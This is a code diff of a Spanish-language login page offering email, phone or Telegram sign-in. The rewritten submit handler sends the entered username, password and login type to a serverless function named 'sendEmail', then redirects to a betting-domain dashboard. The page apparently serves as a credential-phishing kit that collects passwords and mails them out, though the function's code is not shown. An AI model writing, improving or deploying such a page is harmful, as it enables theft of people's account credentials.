@@ -116,6 +116,7 @@
             <div class="tab" onclick="switchTab('telegram')">Iniciar sesión en Telegram</div>
         </div>
         <form id="login-form">
+            <input type="hidden" id="login-type" value="email"> <!-- Guarda el tipo de login -->
             <div class="input-group" id="input-container">
                 <input type="email" id="username" placeholder="Correo electrónico" required>
             </div>
@@ -130,38 +131,58 @@
         </div>
     </div>
     <script>
-    document.getElementById('login-form').addEventListener('submit', async function(event) {
-        event.preventDefault(); // Evita recargar la página
+        function switchTab(type) {
+            const tabs = document.querySelectorAll('.tab');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            let inputContainer = document.getElementById('input-container');
+            let loginType = document.getElementById('login-type');
+            loginType.value = type; // Guarda el tipo de login
 
-        const inputContainer = document.getElementById('input-container');
-        const inputField = inputContainer.querySelector('input');
-        const username = inputField.value;
-        const password = document.getElementById('password').value;
-        let loginType = '';
-
-        if (inputField.type === 'email') {
-            loginType = 'email';
-        } else if (inputField.type === 'tel') {
-            loginType = 'phone';
-        } else {
-            loginType = 'telegram';
+            if (type === 'email') {
+                tabs[0].classList.add('active');
+                inputContainer.innerHTML = '<input type="email" id="username" placeholder="Correo electrónico" required>';
+            } else if (type === 'phone') {
+                tabs[1].classList.add('active');
+                inputContainer.innerHTML = '<span class="country-code">+1</span><input type="tel" id="username" placeholder="Teléfono" required>';
+            } else if (type === 'telegram') {
+                tabs[2].classList.add('active');
+                inputContainer.innerHTML = '<input type="text" id="username" placeholder="Identificación de Telegram" required>';
+            }
         }
 
-        const response = await fetch('/.netlify/functions/sendemail', { // Ajusta la ruta si es necesario
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ loginType, username, password })
+        document.getElementById('login-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            let loginType = document.getElementById('login-type').value;
+
+            let data = {
+                username: username,
+                password: password,
+                loginType: loginType
+            };
+
+            try {
+                let response = await fetch('/.netlify/functions/sendEmail', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                let result = await response.json();
+                alert(result.message);
+
+                if (response.ok) {
+                    window.location.href = "https://acudeenai.bet/dashboard";
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Hubo un problema al enviar los datos.');
+            }
         });
-
-        const result = await response.json();
-
-        if (response.ok) {
-            alert(result.message); // Muestra si el correo se envió correctamente
-            window.location.href = 'https://acudeenai.bet/home'; // Redirige después de enviar
-        } else {
-            alert('Error al enviar el correo. Inténtalo de nuevo.');
-        }
-    });
-</script>
+    </script>
 </body>
 </html>
